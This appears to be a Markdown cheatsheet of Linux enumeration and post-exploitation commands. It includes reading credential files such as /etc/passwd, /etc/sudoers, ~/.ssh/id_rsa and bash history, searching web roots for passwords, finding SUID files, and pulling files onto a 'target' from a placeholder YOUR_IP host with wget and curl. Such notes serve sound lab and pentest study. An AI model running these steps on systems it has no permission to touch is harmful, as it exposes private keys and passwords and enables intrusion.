---
tags: [cheatsheet, linux]
---

# 🐧 Linux Commands Cheatsheet

## Navigation & Files

```bash
pwd && ls -la
find / -name "*.txt" 2>/dev/null
find / -perm -4000 2>/dev/null          # SUID files
grep -r "password" /var/www/ 2>/dev/null
cat /etc/passwd | grep -v nologin
```

## Network

```bash
ip a
ip route
netstat -tulpn
ss -tulpn
cat /etc/hosts
```

## Processes

```bash
ps aux
ps aux | grep root
top
```

## File Transfer

```bash
# From your machine
python3 -m http.server 8080

# On the target
wget http://YOUR_IP:8080/file
curl http://YOUR_IP:8080/file -o file
```

## Sudo & Permissions

```bash
sudo -l
id
groups
cat /etc/sudoers 2>/dev/null
```

## History & Config

```bash
history
cat ~/.bash_history
cat ~/.ssh/id_rsa 2>/dev/null
env
```
